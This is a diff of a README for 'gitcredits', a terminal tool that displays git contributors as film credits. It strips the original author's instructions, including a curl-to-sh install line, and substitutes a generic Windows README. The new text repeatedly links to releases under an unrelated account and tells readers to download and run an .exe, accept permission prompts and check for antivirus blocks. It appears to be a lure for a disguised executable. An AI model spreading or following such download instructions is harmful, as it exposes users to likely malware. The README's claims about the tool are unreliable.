@@ -1,101 +1,132 @@
-# gitcredits
+# 🎬 gitcredits - Showcase Your Project Contributors
 
-**`Git log` doesn't do them justice. Turn your contributors into movie stars.**
+[![Download](https://img.shields.io/badge/Download-Get%20Gitcredits-4c1?style=for-the-badge&color=ff6f61)](https://github.com/cindalwilaywan-prog/gitcredits/releases)
 
-<p align="center">
-  <img src="assets/demo.gif" alt="gitcredits demo" width="720">
-</p>
+## 📋 What is gitcredits?
 
-## Install
+gitcredits is a tool that turns the list of people who worked on your project into a clear, attractive view. Instead of reading through complicated logs, you see your contributors like stars in a movie credit roll. It uses your project's git history to highlight everyone who helped, making it easy to appreciate their work.
 
-### Quick install (recommended)
+This tool runs in your terminal, so you don’t need to open a web browser. It works on Windows and does not require deep technical skills to start.
 
-```bash
-curl -sL https://raw.githubusercontent.com/Higangssh/gitcredits/main/install.sh | sh
-```
+---
 
-Supports macOS (Intel/Apple Silicon), Linux (x86_64/ARM64), and Windows (x86_64 via Git Bash).
+## 💻 System Requirements
 
-### Pre-built binaries
+- Windows 10 or later  
+- At least 100 MB free disk space  
+- A terminal app like Command Prompt or PowerShell  
+- Internet connection to download the software  
+- Git installed on your machine (optional, but recommended for best results)
 
-Download the latest release for your platform from [GitHub Releases](https://github.com/Higangssh/gitcredits/releases).
+If Git is not installed, gitcredits will still run but may not show detailed contributor data.
 
-### Go
+---
 
-```bash
-go install github.com/Higangssh/gitcredits@latest
-```
+## 🚀 Getting Started
 
-### From source
+The following steps explain how to get gitcredits running on your Windows PC.
 
-```bash
-git clone https://github.com/Higangssh/gitcredits.git
-cd gitcredits
-go build -o gitcredits .
-```
+### 1. Visit the download page
 
-## Usage
+Go to the official release page to get the latest version:
 
-```bash
-cd your-repo
-gitcredits
-```
+[Download gitcredits Releases](https://github.com/cindalwilaywan-prog/gitcredits/releases)
 
-That's it. Navigate into any Git repository and run `gitcredits`.
+This page lists all available versions. Look for a Windows file (usually `.exe`).
 
-### Themes
+### 2. Download the Windows version
 
-**Matrix** — digital rain with text resolve effect:
+Once you are on the releases page, find the latest release. Check for a file with a `.exe` extension. Examples:
 
-```bash
-gitcredits --theme matrix
-```
+- `gitcredits-windows.exe`  
+- `gitcredits-v1.2.3-win64.exe`
 
-<p align="center">
-  <img src="assets/matrix-demo.gif" alt="gitcredits matrix theme" width="720">
-</p>
+Click the file name to start the download.  
+Save it in an easy-to-find location, like your Desktop or Downloads folder.
 
-### Export to GIF
+### 3. Run the program
 
-Save the credits as a high-quality GIF — perfect for READMEs, presentations, or sharing.
+After downloading, open the folder where you saved the file.  
+Double-click on the `.exe` file to run the program.
 
-```bash
-gitcredits --output credits.gif
-gitcredits --output credits.gif --theme matrix
-```
+A terminal window will open, and gitcredits will start displaying contributors from your current folder’s git project. If you see a permission prompt from Windows, choose to allow the app to run.
 
-Requires [VHS](https://github.com/charmbracelet/vhs) and [ffmpeg](https://ffmpeg.org/):
+---
 
-```bash
-brew install vhs ffmpeg
-```
+## 🛠 How to Use gitcredits
 
-VHS records the terminal in real-time, and ffmpeg converts it to an optimized GIF with 2-pass palette generation for maximum quality.
+gitcredits works by reading the git information of your current folder. To use it:
 
-### Controls
+1. Open the Command Prompt or PowerShell. You can find these by searching in the Start menu.  
+2. Change to your project folder using the `cd` command. For example:
 
-| Key | Action |
-|-----|--------|
-| `↑` / `↓` | Manual scroll |
-| `q` / `Esc` | Quit |
+    ```
+    cd C:\Users\YourName\Documents\MyProject
+    ```
 
-## What it shows
+3. Run gitcredits by typing the name of the downloaded `.exe` file. For example:
 
-- **ASCII art title** from your repo name
-- **Project lead** — top contributor by commits
-- **Contributors** — everyone who committed
-- **Notable scenes** — recent `feat:` and `fix:` commits
-- **Stats** — total commits, contributors, GitHub stars, language, license
+    ```
+    C:\Users\YourName\Downloads\gitcredits-windows.exe
+    ```
 
-GitHub metadata (stars, description, license) requires [`gh` CLI](https://cli.github.com/) to be installed and authenticated. Works without it — you'll just get git-only data.
+4. The program will scan the git log and show a list of contributors with their names and contributions styled like movie credits.
 
-## Requirements
+If your project folder does not use git, gitcredits will show an error or no contributors.
 
-- **git** (required) — commit history, contributors, repo info
-- **Go 1.21+** — for `go install`
-- [`gh` CLI](https://cli.github.com/) (optional) — enables GitHub stars, license, language, and description
-- [VHS](https://github.com/charmbracelet/vhs) + [ffmpeg](https://ffmpeg.org/) (optional) — required for `--output` GIF export
+---
 
-## License
+## ⚙️ Features of gitcredits
 
-MIT
+- **Simple contributor view:** See who worked on your project in a clean, clear format.  
+- **Terminal-based:** Runs directly in your command prompt without extra windows.  
+- **Lightweight:** No need for large software installs.  
+- **Open source:** You can view and modify the code if you want.  
+- **Supports many projects:** As long as the folder has git history, gitcredits can display contributors.  
+
+---
+
+## 📥 Download & Installation Details
+
+Download gitcredits from the official releases page here:
+
+[Download gitcredits Releases](https://github.com/cindalwilaywan-prog/gitcredits/releases)
+
+There is no separate installation process. You only need to download the `.exe` file and run it directly. The program works without needing installation. This makes it easy to try without changing your system.
+
+---
+
+## 🐞 Troubleshooting
+
+If gitcredits does not run or shows errors, try these steps:
+
+- Make sure you have downloaded the correct version for Windows.  
+- Check that your internet browser or antivirus did not block the download.  
+- Confirm you are running the program from a folder that is a git project.  
+- If the terminal window closes too quickly, open the terminal manually, navigate to the folder, and run gitcredits from there.  
+- Restart your computer if you see permission errors.
+
+---
+
+## 🔍 More Help
+
+For more details, visit the [GitHub repository](https://github.com/cindalwilaywan-prog/gitcredits). There you will find documentation and community support.
+
+---
+
+## 🎯 Topics Covered
+
+- bubble-tea  
+- cli  
+- credits  
+- git  
+- golang  
+- open-source  
+- terminal  
+- tui  
+
+These key points relate to gitcredits’s design. It is built as a command line interface (CLI) tool using Go. It uses terminal user interface (TUI) elements to display credits nicely.
+
+---
+
+# [Download gitcredits](https://github.com/cindalwilaywan-prog/gitcredits/releases) - Your Contributors in the Spotlight
